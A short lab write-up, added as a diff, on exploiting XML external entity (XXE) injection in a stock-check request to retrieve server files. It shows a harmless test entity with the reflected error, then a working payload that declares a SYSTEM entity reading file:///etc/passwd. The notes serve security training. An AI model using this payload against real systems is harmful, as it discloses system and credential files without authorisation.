@@ -1,0 +1,17 @@
+Lab #1: Exploiting XXE using external entities to retrieve files
+
+
+goal: inject XML external entity, retrieve the contents of the /stc/passwd
+
+Analysis:
+
+1. Insert XML entity
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [<!ENTITY test "garr">]><stockCheck><productId>&test;</productId><storeId>1</storeId></stockCheck>
+
+-->"Invalid product ID: garr"
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [<!ENTITY test SYSTEM "file:///etc/passwd">]><stockCheck><productId>&test;</productId><storeId>1</storeId></stockCheck>
